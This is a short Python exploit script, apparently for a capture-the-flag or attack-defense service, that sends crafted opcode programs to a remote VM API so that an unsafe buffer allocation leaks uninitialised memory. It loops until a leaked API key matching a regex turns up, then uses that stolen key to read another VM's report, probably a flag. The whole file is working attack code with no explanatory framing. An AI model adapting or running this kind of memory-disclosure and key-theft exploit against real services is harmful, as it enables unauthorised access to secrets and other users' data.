#!/usr/bin/env python3

import sys
import requests
from enum import Enum, auto, unique
from time import sleep
from uuid import uuid4
import re


@unique
class OPCODE(Enum):
    def _generate_next_value_(name, start, count, last_values):
        return name

    def __str__(self):
        return self.name

    OP_PUSH = auto()
    OP_POP = auto()
    OP_DUP = auto()
    OP_SWAP = auto()
    OP_HIDE = auto()
    OP_CALL = auto()
    OP_INVOKE = auto()
    OP_RESET = auto()
    OP_JMP = auto()
    OP_JMPIF = auto()
    OP_JMPNIF = auto()
    OP_REPORT = auto()
    OP_ADD = auto()
    OP_SUB = auto()
    OP_HLTCHK = auto()
    OP_HLTNCHK = auto()


class VM:
    def __init__(self):
        self.opcodes = []

    def push(self, *opcode):
        self.opcodes.append(list(opcode))

    def serialize(self) -> list:
        return [[str(opcode[0])] + opcode[1:] for opcode in self.opcodes]


ip = sys.argv[1]
hint = sys.argv[2]

vm = VM()

vm.push(OPCODE.OP_RESET)
vm.push(OPCODE.OP_PUSH, 100)
vm.push(OPCODE.OP_PUSH, 1)
vm.push(OPCODE.OP_CALL, "context_Buffer_allocUnsafe")
vm.push(OPCODE.OP_DUP)
vm.push(OPCODE.OP_DUP)

vm.push(OPCODE.OP_PUSH, "_KEY")
vm.push(OPCODE.OP_SWAP)
vm.push(OPCODE.OP_PUSH, 1)
vm.push(OPCODE.OP_SWAP)

vm.push(OPCODE.OP_INVOKE, "indexOf")
vm.push(OPCODE.OP_PUSH, 1)
vm.push(OPCODE.OP_ADD)

vm.push(OPCODE.OP_JMPIF, 13)

vm.push(OPCODE.OP_PUSH, "API_")
vm.push(OPCODE.OP_SWAP)
vm.push(OPCODE.OP_PUSH, 1)
vm.push(OPCODE.OP_SWAP)

vm.push(OPCODE.OP_INVOKE, "indexOf")
vm.push(OPCODE.OP_PUSH, 1)
vm.push(OPCODE.OP_ADD)

vm.push(OPCODE.OP_HLTNCHK)
vm.push(OPCODE.OP_JMP, 22)

opcodes = vm.serialize()

access_key = uuid4()
key = None

while True:
    ids = []

    for i in range(5):
        r = requests.post(f"http://{ip}:5678/api/execute", params={
            "accessKey": access_key
        }, json={
            "opcodes": opcodes
        })

        ids.append(r.json()["result"]["vmId"])

    sleep(3)

    for idx in ids:
        r = requests.get(f"http://{ip}:5678/api/getReport", params={
            "accessKey": access_key,
            "vmId": idx
        })

        keys = re.findall(rb"API_[A-Z2-7]{16}_KEY", r.content)
        if len(keys) > 0:
            key = keys[0].decode()
            break

    if key is not None:
        break

r = requests.get(f"http://{ip}:5678/api/executor/getReport", params={
    "apiKey": key,
    "vmId": hint
})

print(r.json()["result"], flush=True)
